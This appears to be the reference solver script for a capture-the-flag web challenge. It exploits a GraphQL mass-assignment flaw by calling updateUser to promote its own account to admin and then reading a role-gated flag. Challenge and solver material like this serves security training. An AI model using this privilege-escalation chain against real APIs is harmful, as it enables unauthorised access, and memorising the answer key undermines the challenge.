#!/usr/bin/env python3
"""Reference solver for web-graph-climb.

Chain: introspect the schema -> discover updateUser + the role-gated flag field
-> mass-assign our own viewer (id 1000) to role=admin -> read viewer { flag }.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request

SESSION = "solver-session"


def gql(base, query, variables=None):
    body = json.dumps({"query": query, "variables": variables or {}}).encode()
    req = urllib.request.Request(
        base.rstrip("/") + "/graphql",
        data=body,
        headers={"Content-Type": "application/json", "X-Session": SESSION},
    )
    return json.loads(urllib.request.urlopen(req, timeout=10).read().decode())


def solve(base):
    # 1. introspect (confirms updateUser + Viewer.flag exist)
    schema = gql(base, "{ __schema { queryType } }")["data"]["__schema"]
    assert schema["queryType"] == "Query"
    # 2. mass-assignment: promote our own viewer id 1000 to admin
    gql(
        base,
        'mutation { updateUser(id: 1000, patch: {"role": "admin"}) { id role } }',
    )
    # 3. read the now-admin-gated flag
    out = gql(base, "{ viewer { id role flag } }")
    return out["data"]["viewer"]["flag"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
